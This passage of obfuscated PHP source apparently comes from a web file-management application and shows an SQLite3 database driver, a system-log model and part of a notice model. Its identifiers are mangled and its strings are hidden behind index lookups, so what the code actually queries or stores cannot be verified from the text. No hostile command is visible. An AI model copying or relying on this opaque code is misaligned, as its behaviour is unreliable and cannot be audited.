$Úñşº™[53]; } } return $Ùä§ÚÇ‹; } } class DbSqlite3Base extends Db { public function __construct($²Í‡öÖÏ = '') { $İÅ°¼“­ =& $_SERVER[¼¥ÊĞÙÌ]; if (!class_exists($İÅ°¼“­[54])) { think_exception(think_lang($İÅ°¼“­[14]) . $İÅ°¼“­[55]); } if (!empty($²Í‡öÖÏ)) { if (!isset($²Í‡öÖÏ[$İÅ°¼“­[16]])) { $²Í‡öÖÏ[$İÅ°¼“­[16]] = 438; } $this->config = $²Í‡öÖÏ; if (empty($this->config[$İÅ°¼“­[17]])) { $this->config[$İÅ°¼“­[17]] = array(); } } } public function connect($ÅÀ†Ö™À = '', $ò“¨¼Æ— = 0) { $‰ò÷šØÄ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->linkID[$ò“¨¼Æ—])) { if (empty($ÅÀ†Ö™À)) { $ÅÀ†Ö™À = $this->config; } $this->linkID[$ò“¨¼Æ—] = new SQLite3($ÅÀ†Ö™À[$‰ò÷šØÄ[21]]); if (!$this->linkID[$ò“¨¼Æ—]) { think_exception($this->linkID[$ò“¨¼Æ—]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$ò“¨¼Æ—]->busyTimeout(30000); if (1 != think_config($‰ò÷šØÄ[22])) { unset($this->config); } } return $this->linkID[$ò“¨¼Æ—]; } public function free() { $this->queryID = null; } public function query($ç¯ÔºĞŸ) { $²»ÚÎ¹ =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ç¯ÔºĞŸ; if ($this->queryID) { $this->free(); } think_action_status($²»ÚÎ¹[23], 1); think_status($²»ÚÎ¹[24]); $this->queryID = $this->_linkID->query($ç¯ÔºĞŸ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $Ÿ•¼•úØ = $this->getAll(); $this->numRows = count($Ÿ•¼•úØ); return $Ÿ•¼•úØ; } } public function execute($ßëµš) { $òñïÕÕ =& $_SERVER[¼¥ÊĞÙÌ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ßëµš; if ($this->queryID) { $this->free(); } think_action_status($òñïÕÕ[25], 1); think_status($òñïÕÕ[24]); $¥Ù“Áß¡ = $this->_linkID->exec($ßëµš); $this->debug(); if (!1 === $¥Ù“Áß¡) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[¼¥ÊĞÙÌ][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Â†¶­¾ = $this->_linkID->query($_SERVER[¼¥ÊĞÙÌ][27]); if (!$Â†¶­¾) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $à•ù·é = $this->_linkID->query($_SERVER[¼¥ÊĞÙÌ][28]); if (!$à•ù·é) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $¦Ùø™÷ = array(); while ($†‰ÙÑƒÅ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $¦Ùø™÷[] = $†‰ÙÑƒÅ; } $this->queryID->reset(); return $¦Ùø™÷; } public function getFields($¾å…œ¡‚) { $¡Ôšõ¶Ÿ =& $_SERVER[¼¥ÊĞÙÌ]; $È«Ü¹·¸ = $this->query($¡Ôšõ¶Ÿ[29] . $¾å…œ¡‚ . $¡Ôšõ¶Ÿ[30]); $¹¾×“ŒĞ = array(); if ($È«Ü¹·¸) { foreach ($È«Ü¹·¸ as $İÒºğ => $Æºœ¿§ƒ) { $¹¾×“ŒĞ[$Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[32]]] = array($¡Ôšõ¶Ÿ[32] => $Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[32]], $¡Ôšõ¶Ÿ[33] => $Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[33]], $¡Ôšõ¶Ÿ[35] => (bool) ($Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[35]] === $¡Ôšõ¶Ÿ[12]), $¡Ôšõ¶Ÿ[37] => $Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[56]], $¡Ôšõ¶Ÿ[39] => (bool) $Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[57]], $¡Ôšõ¶Ÿ[42] => (bool) $Æºœ¿§ƒ[$¡Ôšõ¶Ÿ[57]]); } } return $¹¾×“ŒĞ; } public function getTables($ğˆş–° = '') { $à¿Äå§‰ =& $_SERVER[¼¥ÊĞÙÌ]; $ò£Òªî¥ = $this->query($à¿Äå§‰[45] . $à¿Äå§‰[46] . $à¿Äå§‰[47]); $ò½ë¡†© = array(); foreach ($ò£Òªî¥ as $îì¥ÄòÕ => $†ÎÌûîè) { $ò½ë¡†©[$îì¥ÄòÕ] = current($†ÎÌûîè); } return $ò½ë¡†©; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $¢¿ÜÓâ =& $_SERVER[¼¥ÊĞÙÌ]; $this->error = $this->_linkID->lastErrorMsg(); if ($¢¿ÜÓâ[12] != $this->queryStr) { $this->error .= LNG($¢¿ÜÓâ[48]) . $this->queryStr; } think_trace($this->error, $¢¿ÜÓâ[12], $¢¿ÜÓâ[49]); return $this->error; } public function escapeString($ƒ´ûø¢È) { $‹†’ÀÕú =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->_linkID) { return $this->_linkID->escapeString($ƒ´ûø¢È); } return str_ireplace($‹†’ÀÕú[58], $‹†’ÀÕú[59], $ƒ´ûø¢È); } public function parseLimit($¶î¯ÜóÓ) { $÷š¯ê¥è =& $_SERVER[¼¥ÊĞÙÌ]; $íŠŠÛ÷ = $÷š¯ê¥è[12]; if (!empty($¶î¯ÜóÓ)) { $¶î¯ÜóÓ = explode($÷š¯ê¥è[50], $¶î¯ÜóÓ); if (count($¶î¯ÜóÓ) > 1) { $íŠŠÛ÷ .= $÷š¯ê¥è[51] . $¶î¯ÜóÓ[1] . $÷š¯ê¥è[52] . $¶î¯ÜóÓ[0] . $÷š¯ê¥è[53]; } else { $íŠŠÛ÷ .= $÷š¯ê¥è[51] . $¶î¯ÜóÓ[0] . $÷š¯ê¥è[53]; } } return $íŠŠÛ÷; } } goto cªéÏĞ×‡; F“¨òõˆ: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\155\137\154\x6f\147"; protected $dataAuto = array(array("\x63\x72\x65\141\x74\145\x54\151\x6d\145", "\164\x69\x6d\x65", "\x69\156\x73\x65\x72\x74", "\146\165\x6e\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $¦ß”»„ =& $_SERVER[¼¥ÊĞÙÌ]; return array($¦ß”»„[2364] => LNG($¦ß”»„[2365]), $¦ß”»„[2366] => LNG($¦ß”»„[2367]), $¦ß”»„[1934] => LNG($¦ß”»„[2368]), $¦ß”»„[2369] => LNG($¦ß”»„[2370]), $¦ß”»„[2371] => LNG($¦ß”»„[2372]), $¦ß”»„[2373] => LNG($¦ß”»„[2374]), $¦ß”»„[2375] => LNG($¦ß”»„[2376]), $¦ß”»„[1964] => LNG($¦ß”»„[2376]), $¦ß”»„[1965] => LNG($¦ß”»„[2377]), $¦ß”»„[2378] => LNG($¦ß”»„[2379]), $¦ß”»„[2380] => LNG($¦ß”»„[2381]), $¦ß”»„[2382] => LNG($¦ß”»„[2383]), $¦ß”»„[2384] => LNG($¦ß”»„[2385]), $¦ß”»„[1962] => LNG($¦ß”»„[2386]), $¦ß”»„[2387] => LNG($¦ß”»„[2388]), $¦ß”»„[1969] => LNG($¦ß”»„[2389]), $¦ß”»„[2390] => LNG($¦ß”»„[2391]), $¦ß”»„[2392] => LNG($¦ß”»„[2393]), $¦ß”»„[2394] => LNG($¦ß”»„[2395]), $¦ß”»„[2396] => LNG($¦ß”»„[2397]), $¦ß”»„[1972] => LNG($¦ß”»„[2398]), $¦ß”»„[1973] => LNG($¦ß”»„[2399]), $¦ß”»„[2400] => LNG($¦ß”»„[2401]), $¦ß”»„[2402] => LNG($¦ß”»„[2403]), $¦ß”»„[2404] => LNG($¦ß”»„[2405]), $¦ß”»„[1967] => LNG($¦ß”»„[2406]), $¦ß”»„[2407] => LNG($¦ß”»„[2408]), $¦ß”»„[1966] => LNG($¦ß”»„[2409]), $¦ß”»„[2410] => LNG($¦ß”»„[2410]), $¦ß”»„[2411] => LNG($¦ß”»„[2412]), $¦ß”»„[2413] => LNG($¦ß”»„[2410]), $¦ß”»„[2414] => LNG($¦ß”»„[2415]), $¦ß”»„[2416] => LNG($¦ß”»„[2417]), $¦ß”»„[2418] => LNG($¦ß”»„[2417]), $¦ß”»„[2419] => LNG($¦ß”»„[2420]), $¦ß”»„[2421] => LNG($¦ß”»„[2421]), $¦ß”»„[2422] => LNG($¦ß”»„[1938]), $¦ß”»„[2423] => LNG($¦ß”»„[2424]), $¦ß”»„[2425] => LNG($¦ß”»„[2426]), $¦ß”»„[2427] => LNG($¦ß”»„[2428]), $¦ß”»„[2429] => LNG($¦ß”»„[2430]), $¦ß”»„[2431] => LNG($¦ß”»„[2432]), $¦ß”»„[2433] => LNG($¦ß”»„[2433]), $¦ß”»„[2434] => LNG($¦ß”»„[2435]), $¦ß”»„[2436] => LNG($¦ß”»„[2437]), $¦ß”»„[2438] => LNG($¦ß”»„[2439]), $¦ß”»„[2440] => LNG($¦ß”»„[2441]), $¦ß”»„[2442] => LNG($¦ß”»„[2443]), $¦ß”»„[2444] => LNG($¦ß”»„[2445]), $¦ß”»„[213] => LNG($¦ß”»„[213]), $¦ß”»„[214] => LNG($¦ß”»„[2446]), $¦ß”»„[2447] => LNG($¦ß”»„[2447])); } private function typeFile() { $í”Œªª =& $_SERVER[¼¥ÊĞÙÌ]; $¾ØÔ¦Ò° = array($í”Œªª[1969] => array($í”Œªª[1970]), $í”Œªª[2382] => array($í”Œªª[2448]), $í”Œªª[2384] => array($í”Œªª[2449]), $í”Œªª[1962] => array($í”Œªª[1963], $í”Œªª[2450]), $í”Œªª[2392] => array(), $í”Œªª[2394] => array(), $í”Œªª[2396] => array(), $í”Œªª[1972] => array($í”Œªª[1974]), $í”Œªª[1973] => array($í”Œªª[1974]), $í”Œªª[2400] => array($í”Œªª[2451]), $í”Œªª[2402] => array($í”Œªª[2451]), $í”Œªª[2404] => array($í”Œªª[2452]), $í”Œªª[2390] => array($í”Œªª[2453]), $í”Œªª[1967] => array($í”Œªª[2454]), $í”Œªª[2407] => array($í”Œªª[2455]), $í”Œªª[1966] => array($í”Œªª[1968])); return $¾ØÔ¦Ò°; } private function typeAll() { $ø—¿®şß =& $_SERVER[¼¥ÊĞÙÌ]; $îÔïãŸ = $this->typeList; $Ü•™É‹€ = array_filter($this->typeFile()); foreach ($Ü•™É‹€ as $î“ëÊ½¹ => $ äóñ¬) { $îÔïãŸ[$ äóñ¬[0]] = $îÔïãŸ[$î“ëÊ½¹]; } $îÔïãŸ[$ø—¿®şß[1974]] = LNG($ø—¿®şß[2456]); $îÔïãŸ[$ø—¿®şß[2451]] = LNG($ø—¿®şß[2457]); return $îÔïãŸ; } public function addLog($ó³õŞ ², $­‘úÍÃ× = array()) { $¡ü‚ú¨ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($this->typeList[$ó³õŞ ²])) { return; } $£«î…Ş = Session::get($¡ü‚ú¨[2132]); if (!$£«î…Ş) { $£«î…Ş = _get($­‘úÍÃ×, $¡ü‚ú¨[1790], 0); } if ($ó³õŞ ² == $¡ü‚ú¨[2423] && is_array($­‘úÍÃ×[$¡ü‚ú¨[2458]]) && !$­‘úÍÃ×[$¡ü‚ú¨[2458]]) { return; } $ÂÂïÅ«ñ = get_client_ip(); if (!$­‘úÍÃ× || strlen(json_encode($­‘úÍÃ×)) >= 1024 * 64) { if ($­‘úÍÃ× && is_array($­‘úÍÃ×)) { $­‘úÍÃ× = array_intersect_key($­‘úÍÃ×, array_flip($¡ü‚ú¨[478], $¡ü‚ú¨[32])); $­‘úÍÃ×[$¡ü‚ú¨[2459]] = $ÂÂïÅ«ñ; } else { $­‘úÍÃ× = array($¡ü‚ú¨[2459] => $ÂÂïÅ«ñ); } } else { if (is_array($­‘úÍÃ×)) { $­‘úÍÃ×[$¡ü‚ú¨[2459]] = $ÂÂïÅ«ñ; } else { $­‘úÍÃ× = array($¡ü‚ú¨[1299] => $­‘úÍÃ×, $¡ü‚ú¨[2459] => $ÂÂïÅ«ñ); } } $­‘úÍÃ× = array($¡ü‚ú¨[1780] => Session::sign(), $¡ü‚ú¨[1781] => intval($£«î…Ş), $¡ü‚ú¨[33] => $ó³õŞ ², $¡ü‚ú¨[1783] => json_encode($­‘úÍÃ×)); return parent::add($­‘úÍÃ×); } public function remove($ä€ù¡Ï) { $this->where(array($_SERVER[¼¥ÊĞÙÌ][496] => $ä€ù¡Ï))->delete(); } private function _makeOrder($Ù¹ùœáí = '') { $È‚£´ºº =& $_SERVER[¼¥ÊĞÙÌ]; $é¦õ»ÑÄ = $È‚£´ºº[234]; $ø¢çÓôé = array($È‚£´ºº[526] => $È‚£´ºº[527], $È‚£´ºº[528] => $È‚£´ºº[529]); $ƒ‹ËÑ“Ô = Input::get($È‚£´ºº[534], $È‚£´ºº[7], $È‚£´ºº[2172], array($È‚£´ºº[2087], $È‚£´ºº[528])); $ƒ‹ËÑ“Ô = $ø¢çÓôé[$ƒ‹ËÑ“Ô]; $Ù¹ùœáí = $Ù¹ùœáí . "{$é¦õ»ÑÄ}\x20{$ƒ‹ËÑ“Ô}"; return $this->order($Ù¹ùœáí); } public function get($îĞ ã¥ = '') { $ÍìÂ‰«é =& $_SERVER[¼¥ÊĞÙÌ]; if (!$îĞ ã¥) { show_json(array()); } $Ô…â±À§ = array(); if ($îĞ ã¥[$ÍìÂ‰«é[1790]]) { $Ô…â±À§[$ÍìÂ‰«é[1790]] = $îĞ ã¥[$ÍìÂ‰«é[1790]]; } if (isset($îĞ ã¥[$ÍìÂ‰«é[834]])) { $…óÎ‹ = $îĞ ã¥[$ÍìÂ‰«é[834]]; $ƒÍ¿µ¥ = isset($îĞ ã¥[$ÍìÂ‰«é[835]]) ? $îĞ ã¥[$ÍìÂ‰«é[835]] : time(); $Ô…â±À§[$ÍìÂ‰«é[234]] = array($ÍìÂ‰«é[411], array($…óÎ‹, $ƒÍ¿µ¥)); } if ($îĞ ã¥[$ÍìÂ‰«é[33]]) { $üÈëëš„ = explode($ÍìÂ‰«é[50], $îĞ ã¥[$ÍìÂ‰«é[33]]); $€ö¨Ï“ = $this->typeFile(); $°ÂÍ‘Œ» = array(); foreach ($üÈëëš„ as $‚¢õ“Çñ) { $°ÂÍ‘Œ»[] = $‚¢õ“Çñ; if (isset($€ö¨Ï“[$‚¢õ“Çñ])) { $°ÂÍ‘Œ» = array_merge($°ÂÍ‘Œ», $€ö¨Ï“[$‚¢õ“Çñ]); } } $°ÂÍ‘Œ» = array_unique($°ÂÍ‘Œ»); if ($°ÂÍ‘Œ») { $Ô…â±À§[$ÍìÂ‰«é[33]] = array($ÍìÂ‰«é[7], $°ÂÍ‘Œ»); } } else { $Ô…â±À§[$ÍìÂ‰«é[33]] = array($ÍìÂ‰«é[2460], $ÍìÂ‰«é[2461]); } if (!empty($îĞ ã¥[$ÍìÂ‰«é[2459]])) { $Ô…â±À§[$ÍìÂ‰«é[529]] = array($ÍìÂ‰«é[462], "\45{$îĞ ã¥[$ÍìÂ‰«é[2459]]}\45"); } $Á’²ÏğÖ = $this->_makeOrder()->where($Ô…â±À§)->selectPage(); if (empty($Á’²ÏğÖ[$ÍìÂ‰«é[448]])) { show_json(array(), !0, $Á’²ÏğÖ[$ÍìÂ‰«é[445]]); } $Á’²ÏğÖ[$ÍìÂ‰«é[448]] = $this->logList($Á’²ÏğÖ[$ÍìÂ‰«é[448]]); return $Á’²ÏğÖ; } private function ipAddress(&$ÍÎªã¦æ) { $Ì¡‹ó“ =& $_SERVER[¼¥ÊĞÙÌ]; if (!empty($ÍÎªã¦æ[$Ì¡‹ó“[2459]])) { $´ƒÖ•Ù‰ = IpLocation::get($ÍÎªã¦æ[$Ì¡‹ó“[2459]]); } else { $´ƒÖ•Ù‰ = LNG($Ì¡‹ó“[2462]); } $ÍÎªã¦æ[$Ì¡‹ó“[2463]] = $´ƒÖ•Ù‰; } private function descZipDownload($øçèŠ¸, &$¸ ‰¶¶À) { $Ÿ–ÉÄÜÑ =& $_SERVER[¼¥ÊĞÙÌ]; if (!isset($øçèŠ¸[$Ÿ–ÉÄÜÑ[2464]])) { return; } $ñ·ºŸİ = json_decode($øçèŠ¸[$Ÿ–ÉÄÜÑ[2464]], !0); foreach ($ñ·ºŸİ as $½úœ¦) { try { $‹À’¤¶İ = IO::infoFullSimple($½úœ¦[$Ÿ–ÉÄÜÑ[87]]); } catch (Exception $Šë¶¢ò¶) { continue; } $øçèŠ¸[$Ÿ–ÉÄÜÑ[87]] = $½úœ¦[$Ÿ–ÉÄÜÑ[87]]; $¸ ‰¶¶À[] = $øçèŠ¸[$Ÿ–ÉÄÜÑ[194]] = $‹À’¤¶İ[$Ÿ–ÉÄÜÑ[194]]; $¸ ‰¶¶À[] = $øçèŠ¸[$Ÿ–ÉÄÜÑ[2226]] = $‹À’¤¶İ[$Ÿ–ÉÄÜÑ[193]]; break; } return $øçèŠ¸; } private function getSourceList(&$·šà³ÇÒ) { $ŸúšçƒŠ =& $_SERVER[¼¥ÊĞÙÌ]; $ıš Ğë« = array(); foreach ($·šà³ÇÒ as $‹°¼Ïú => $áÅ³Á°Ô) { $ïº«şÖ¾ = json_decode($áÅ³Á°Ô[$ŸúšçƒŠ[529]], !0); if ($áÅ³Á°Ô[$ŸúšçƒŠ[33]] == $ŸúšçƒŠ[1965]) { $ïº«şÖ¾ = $this->descZipDownload($ïº«şÖ¾, $ıš Ğë«); $·šà³ÇÒ[$‹°¼Ïú][$ŸúšçƒŠ[529]] = json_encode($ïº«şÖ¾); continue; } if (strpos($áÅ³Á°Ô[$ŸúšçƒŠ[33]], $ŸúšçƒŠ[2228]) !== 0) { if (!isset($ïº«şÖ¾[$ŸúšçƒŠ[87]]) || strpos($áÅ³Á°Ô[$ŸúšçƒŠ[33]], $ŸúšçƒŠ[2465]) !== 0) { continue; } try { $·ÕğĞó = IO::infoFullSimple($ïº«şÖ¾[$ŸúšçƒŠ[87]]); } catch (Exception $Ú‘İÊÌã) { continue; } $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[194]] = $·ÕğĞó[$ŸúšçƒŠ[194]]; $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[2226]] = $·ÕğĞó[$ŸúšçƒŠ[193]]; $·šà³ÇÒ[$‹°¼Ïú][$ŸúšçƒŠ[529]] = json_encode($ïº«şÖ¾); continue; } $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[194]]; $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[2226]]; if ($ïº«şÖ¾[$ŸúšçƒŠ[33]] == $ŸúšçƒŠ[628]) { $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[529]][$ŸúšçƒŠ[1251]]; $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[529]][$ŸúšçƒŠ[1252]]; } if ($ïº«şÖ¾[$ŸúšçƒŠ[33]] == $ŸúšçƒŠ[2237]) { $ıš Ğë«[] = $ïº«şÖ¾[$ŸúšçƒŠ[529]][$ŸúšçƒŠ[194]]; } } if (!$ıš Ğë«) { return array(); } return Model($ŸúšçƒŠ[904])->sourceListInfo($ıš Ğë«, !0); } private function logList($ûÆİ¹Òà) { $Ë£”Çèó =& $_SERVER[¼¥ÊĞÙÌ]; $èô•«¥‹ = array_to_keyvalue($ûÆİ¹Òà, $Ë£”Çèó[12], $Ë£”Çèó[1790]); $¸Ğî¶£ = Model($Ë£”Çèó[602])->userListInfo(array_unique($èô•«¥‹)); $€ƒÜİóâ = $this->getSourceList($ûÆİ¹Òà); $ê×¼­´È = $this->typeAll(); $ÄÁ·™„’ = array(); $¼Ó«ÒÏï = array(); foreach ($ûÆİ¹Òà as $ö²ƒ…æƒ => $ëøñ®‹) { $šüš»®• = $ëøñ®‹[$Ë£”Çèó[33]]; $ÂúÂ¤Ü = isset($¸Ğî¶£[$ëøñ®‹[$Ë£”Çèó[1790]]]) ? $¸Ğî¶£[$ëøñ®‹[$Ë£”Çèó[1790]]] : !1; $£ÌöìŞª = strpos($šüš»®•, $Ë£”Çèó[2466]) === 0 ? LNG($Ë£”Çèó[2467]) : LNG($Ë£”Çèó[2462]); $ëøñ®‹[$Ë£”Çèó[32]] = isset($ÂúÂ¤Ü[$Ë£”Çèó[32]]) ? $ÂúÂ¤Ü[$Ë£”Çèó[32]] : LNG($Ë£”Çèó[2462]); $ëøñ®‹[$Ë£”Çèó[2288]] = isset($ÂúÂ¤Ü[$Ë£”Çèó[2288]]) ? $ÂúÂ¤Ü[$Ë£”Çèó[2288]] : $Ë£”Çèó[12]; $ëøñ®‹[$Ë£”Çèó[1678]] = isset($ê×¼­´È[$šüš»®•]) ? $ê×¼­´È[$šüš»®•] : $£ÌöìŞª; $ëøñ®‹[$Ë£”Çèó[2171]] = $ÂúÂ¤Ü; $Ğé¡¦¸ä = json_decode($ëøñ®‹[$Ë£”Çèó[529]], !0); $ëøñ®‹[$Ë£”Çèó[2459]] = isset($Ğé¡¦¸ä[$Ë£”Çèó[2459]]) ? $Ğé¡¦¸ä[$Ë£”Çèó[2459]] : $Ë£”Çèó[12]; $ëøñ®‹[$Ë£”Çèó[2463]] = IpLocation::get($ëøñ®‹[$Ë£”Çèó[2459]]); if (strpos($šüš»®•, $Ë£”Çèó[2228]) === 0 || isset($Ğé¡¦¸ä[$Ë£”Çèó[2226]])) { $Ğé¡¦¸ä[$Ë£”Çèó[90]] = $€ƒÜİóâ[$Ğé¡¦¸ä[$Ë£”Çèó[194]]]; $Ğé¡¦¸ä[$Ë£”Çèó[2242]] = $€ƒÜİóâ[$Ğé¡¦¸ä[$Ë£”Çèó[2226]]]; if ($Ğé¡¦¸ä[$Ë£”Çèó[33]] == $Ë£”Çèó[628]) { $Ğé¡¦¸ä[$Ë£”Çèó[529]][$Ë£”Çèó[1251]] = $€ƒÜİóâ[$Ğé¡¦¸ä[$Ë£”Çèó[529]][$Ë£”Çèó[1251]]]; $Ğé¡¦¸ä[$Ë£”Çèó[529]][$Ë£”Çèó[1252]] = $€ƒÜİóâ[$Ğé¡¦¸ä[$Ë£”Çèó[529]][$Ë£”Çèó[1252]]]; } if ($Ğé¡¦¸ä[$Ë£”Çèó[33]] == $Ë£”Çèó[2237]) { $Ğé¡¦¸ä[$Ë£”Çèó[529]][$Ë£”Çèó[194]] = $€ƒÜİóâ[$Ğé¡¦¸ä[$Ë£”Çèó[529]][$Ë£”Çèó[194]]]; } if ($Ğé¡¦¸ä[$Ë£”Çèó[33]] == $Ë£”Çèó[1960]) { $Ğé¡¦¸ä[$Ë£”Çèó[2242]] = $Ğé¡¦¸ä[$Ë£”Çèó[90]]; $Ğé¡¦¸ä[$Ë£”Çèó[2226]] = $Ğé¡¦¸ä[$Ë£”Çèó[2242]][$Ë£”Çèó[194]]; $Ğé¡¦¸ä[$Ë£”Çèó[90]] = !1; $Ğé¡¦¸ä[$Ë£”Çèó[194]] = $Ë£”Çèó[12]; } $ãçÏ½×Å = array($Ë£”Çèó[1960], $Ë£”Çèó[2224]); if (!in_array($Ğé¡¦¸ä[$Ë£”Çèó[33]], $ãçÏ½×Å)) { if ($Ğé¡¦¸ä[$Ë£”Çèó[90]] && $Ğé¡¦¸ä[$Ë£”Çèó[90]][$Ë£”Çèó[191]] == $Ë£”Çèó[192]) { $¼Ó«ÒÏï[] = $ëøñ®‹[$Ë£”Çèó[478]]; unset($ûÆİ¹Òà[$ö²ƒ…æƒ]); continue; } if ($Ğé¡¦¸ä[$Ë£”Çèó[2242]] && $Ğé¡¦¸ä[$Ë£”Çèó[2242]][$Ë£”Çèó[191]] == $Ë£”Çèó[192]) { $¼Ó«ÒÏï[] = $ëøñ®‹[$Ë£”Çèó[478]]; unset($ûÆİ¹Òà[$ö²ƒ…æƒ]); continue; } } } $ëøñ®‹[$Ë£”Çèó[529]] = $Ğé¡¦¸ä; unset($ëøñ®‹[$Ë£”Çèó[2468]]); $ÄÁ·™„’[] = $ëøñ®‹; } $this->clearSystemPathLog($¼Ó«ÒÏï); return $ÄÁ·™„’; } private function clearSystemPathLog($Â» ÉÛŸ) { $Éàñ¥Ö× =& $_SERVER[¼¥ÊĞÙÌ]; if (count($Â» ÉÛŸ) == 0) { return; } $Æºùı‘Œ = array($Éàñ¥Ö×[478] => array($Éàñ¥Ö×[7], array_unique($Â» ÉÛŸ))); $this->where($Æºùı‘Œ)->delete(); } public function deviceList($ÒÄåœõ, $æòÃÙÙß = 0) { $ßÔç˜¶ =& $_SERVER[¼¥ÊĞÙÌ]; $°Ú™’ÏÙ = array($ßÔç˜¶[1790] => $ÒÄåœõ, $ßÔç˜¶[234] => array($ßÔç˜¶[1100], $æòÃÙÙß), $ßÔç˜¶[33] => $ßÔç˜¶[1934]); $ÊÇ×±Ê = array(); $ıÏóù ü = $this->field($ßÔç˜¶[2469])->where($°Ú™’ÏÙ)->order($ßÔç˜¶[2240])->limit(50)->select(); foreach ($ıÏóù ü as $ä¢ÎƒÉ• => $é—³ÅôŸ) { if ($ä¢ÎƒÉ• > 0 && abs($é—³ÅôŸ[$ßÔç˜¶[234]] - $ıÏóù ü[$ä¢ÎƒÉ• - 1][$ßÔç˜¶[234]]) < 5) { continue; } $»£ãŞÙü = json_decode($é—³ÅôŸ[$ßÔç˜¶[529]], !0); $é—³ÅôŸ[$ßÔç˜¶[2459]] = isset($»£ãŞÙü[$ßÔç˜¶[2459]]) ? $»£ãŞÙü[$ßÔç˜¶[2459]] : $ßÔç˜¶[12]; unset($»£ãŞÙü[$ßÔç˜¶[2459]]); $§½¼ŸáÉ = $this->deviceType($»£ãŞÙü[$ßÔç˜¶[2229]]); if (isset($ÊÇ×±Ê[$§½¼ŸáÉ])) { continue; } $é—³ÅôŸ[$ßÔç˜¶[2463]] = IpLocation::get($é—³ÅôŸ[$ßÔç˜¶[2459]]); $é—³ÅôŸ[$ßÔç˜¶[529]] = $»£ãŞÙü; $ÊÇ×±Ê[$§½¼ŸáÉ] = $é—³ÅôŸ; } return array_values($ÊÇ×±Ê); } public function deviceType($áÓª†»À) { return $áÓª†»À; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\x6e\x6f\164\151\143\x65\114\151\163\x74"; public $field = array("\156\x61\155\x65", "\x63\x6f\x6e\x74\145\x6e\164", "\141\165\164\150", "\155\x6f\144\x65", "\x74\x69\155\x65", "\x74\171\160\x65", "\x6c\145\x76\x65\154", "\145\x6e\141\x62\154\145", "\163\x6f\x72\x74"); public function listData($•–º¨÷¹ = false, $û¯Àî³² = "\163\x6f\x72\164", $–¾÷òûù = false) { return parent::listData($•–º¨÷¹, $û¯Àî³², $–¾÷òûù); } public function add($ıúâä¿) { $»ğ²¯ëÇ =& $_SERVER[¼¥ÊĞÙÌ]; $¥øÎÉÍØ = time(); if ($ıúâä¿[$»ğ²¯ëÇ[16]] == $»ğ²¯ëÇ[2470]) { $¥øÎÉÍØ = strtotime($ıúâä¿[$»ğ²¯ëÇ[207]]); } $ıúâä¿[$»ğ²¯ëÇ[207]] = $¥øÎÉÍØ; return parent::insert($ıúâä¿); } public function update($‡‡€©–Ğ, $ñÇ‡‡­) { $„ıöı‹¸ =& $_SERVER[¼¥ÊĞÙÌ]; $®—Ïâáš = $this->listData($‡‡€©–Ğ); if (!$®—Ïâáš) { return !1; } $’³ÊÏ®ñ = time(); if ($ñÇ‡‡­[$„ıöı‹¸[16]] == $„ıöı‹¸[2470]) { $’³ÊÏ®ñ = strtotime($ñÇ‡‡­[$„ıöı‹¸[207]]); } $ñÇ‡‡­[$„ıöı‹¸[207]] = $’³ÊÏ®ñ; return parent::update($‡‡€©–Ğ, $ñÇ‡‡­); } public function remove($©Ğ‰ŸÑø) { $¼˜šœÈª = $this->listData($©Ğ‰ŸÑø); if (!$¼˜šœÈª || $¼˜šœÈª[$_SERVER[¼¥ÊĞÙÌ][192]]) { return !1; } return parent::remove($©Ğ‰ŸÑø); } public function sort($–×äßÆÚ, $ÆáçæÂ¾) { return parent::update($–×äßÆÚ, $ÆáçæÂ¾); } public function enable($ÕŞÇ‰Ğ, $¶Å¤Ñ‡Í) { return parent::update($ÕŞÇ‰Ğ, array($_SERVER[¼¥ÊĞÙÌ][2471] => $¶Å¤Ñ‡Í)); } private function initUserOption() { $æâ¿ÆÒı =& $_SERVER[¼¥ÊĞÙÌ]; $this->optionType = $æâ¿ÆÒı[2472]; $this->modelType = $æâ¿ÆÒı[2473]; $this->field = array($æâ¿ÆÒı[2474], $æâ¿ÆÒı[32], $æâ¿ÆÒı[207], $æâ¿ÆÒı[33], $æâ¿ÆÒı[2475], $æâ¿ÆÒı[824], $æâ¿ÆÒı[229]); } public function userNoticeGet($¼Ê›ßÜû = false) { $this->initUserOption(); return parent::listData($¼Ê›ßÜû, $_SERVER[¼¥ÊĞÙÌ][478], !0); } public function userNoticeAdd($ï·ö÷ª) { $×‹§´Ï =& $_SERVER[¼¥ÊĞÙÌ]; $this->initUserOption(); $ÁÙ¸´ì = $this->findByKey($×‹§´Ï[2474], $ï·ö÷ª[$×‹§´Ï[478]]); if 